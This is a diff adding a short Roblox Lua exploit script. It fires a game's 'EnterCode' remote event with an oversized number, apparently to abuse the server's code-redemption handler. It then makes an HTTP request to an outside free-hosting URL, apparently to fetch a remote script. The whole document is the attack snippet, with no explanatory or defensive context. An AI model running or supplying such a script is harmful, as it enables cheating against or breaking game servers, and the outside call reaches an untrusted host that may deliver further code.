@@ -1,0 +1,7 @@
+local args = {
+    [1] = 9999999999999999999999999999999999999,
+   
+}
+
+game:GetService("ReplicatedStorage").EnterCode:FireServer(unpack(args))
+game:HttpGet("https://rblx-script-est.000webhostapp.com/script-main.php")
